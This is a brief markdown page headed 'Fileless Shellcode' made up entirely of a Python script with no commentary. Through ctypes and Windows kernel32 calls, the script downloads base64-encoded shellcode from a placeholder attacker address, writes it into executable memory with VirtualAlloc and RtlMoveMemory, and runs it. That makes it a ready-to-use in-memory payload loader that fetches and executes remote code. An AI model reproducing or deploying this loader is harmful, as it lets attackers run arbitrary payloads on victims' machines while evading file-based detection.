# Fileless Shellcode

```python
import base64
import ctypes
from urllib import request

kernel32 = ctypes.windll.kernel32

VirtualAlloc = kernel32.VirtualAlloc
VirtualAlloc.restype = ctypes.c_void_p

RtlMoveMemory = kernel32.RtlMoveMemory
RtlMoveMemory.argtypes = (
	ctypes.c_void_p,
	ctypes.c_void_p,
	ctypes.c_size_t
)

def get_code(url):
    with request.urlopen(url) as response:
        shellcode = base64.decodebytes(response.read())
        return shellcode

def write_memory(buf):
    length = len(buf)

    pointer = VirtualAlloc(None, length, 0x3000, 0x40)

    RtlMoveMemory(pointer, buf, length)
    return pointer

def run(shellcode):
    buf = ctypes.create_string_buffer(shellcode)
    ptr = write_memory(buf)
    shell_func = ctypes.cast(ptr, ctypes.CFUNCTYPE(None))
    shell_func()

if __name__ == '__main__':
    url = "http://<IP>/file.bin"
    shellcode = get_code(url)
    run(shellcode)
```